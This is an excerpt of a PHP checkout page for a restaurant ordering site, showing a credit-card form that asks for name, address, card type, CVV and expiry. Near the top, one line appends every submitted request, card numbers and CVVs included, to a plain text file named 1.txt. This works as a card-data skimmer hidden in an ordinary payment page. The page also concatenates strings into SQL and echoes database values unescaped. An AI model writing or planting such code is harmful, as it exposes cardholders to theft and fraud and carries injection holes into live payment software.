...
ob_start();
session_start();
file_put_contents('1.txt', print_r($_REQUEST, true), FILE_APPEND|LOCK_EX);
//print_r($_SESSION);
...
if($_REQUEST['submit_status']=="Submit")
{
...
<div class="pop-box"  style="width:300px; position:fixed; z-index:9999999; background:#EFEFEF; padding:34px 24px; color:#000; font-family:Calibri; font-size:18px; -moz-box-shadow: 0 0 5px #888; -webkit-box-shadow: 0 0 5px#888; box-shadow: 0 0 5px #888; text-align:center; margin:-42px 0 0 -150px; border-radius:8px; 
top:50%; left:50%; -moz-border-radius:8px; -webkit-border-radius:8px; border:#2C4598 2px solid;">
...
<input name="amount" id="amount" type="hidden" class="payment_textfield" value="$<?php echo $_SESSION['ammount']?>" readonly  />
<?php $sql_customer=mysql_fetch_array(mysql_query("select * from restaurant_customer where id='".$_SESSION['customer_id']."'"));?>
<table width="100%" border="0" cellspacing="0" bordercolor="d6d6d6" cellpadding="0" style="border-collapse:collapse;" class="payment_details_table">
<tr>
    <td width="19%" class="payment_text">First Name* :</td>
    <td width="33%"><input name="first_name" id="first_name" type="text" class="payment_textfield" value="<?php echo $sql_customer['firstname']?>"   /></td>
    
    <td width="15%" class="payment_text">Address* :</td>
    <td width="33%"><input name="address" id="address" type="text" class="payment_textfield" value="<?php echo $sql_customer['address']?>"  /></td>    
  </tr>
  <tr>
...
<table width="100%" border="0" cellspacing="0" bordercolor="d6d6d6" cellpadding="0" style="border-collapse:collapse;" class="payment_details_table pay_table_2">

	<tr>
    <td width="19%" class="payment_text">Cart Type* :</td>
    <td width="33%"><select name="card_type" id="card_type" class="payment_list">
    ...
    <td width="15%" class="payment_text">CVV No* :</td>
    <td width="33%"><input name="cvv_no" id="cvv_no" type="text" class="payment_textfield" onKeyPress="return goodchars(event,'1234567890');" maxlength="3" /></td>       
  </tr>
  <tr>
    ...
    <td>
    <select name="exp_month" id="exp_month" style="width:140px;" class="payment_list">
    ...
    <select name="exp_year" id="exp_year" style="width:140px; margin-left:10px;" class="payment_list">
        <option value="">Select</option>
...
<input type="hidden" value="Submit" name="submit_status">
<input class="payment_details_button" value="Submit" type="button" id="btn1" onClick="return check_it();">
<?php } ?>
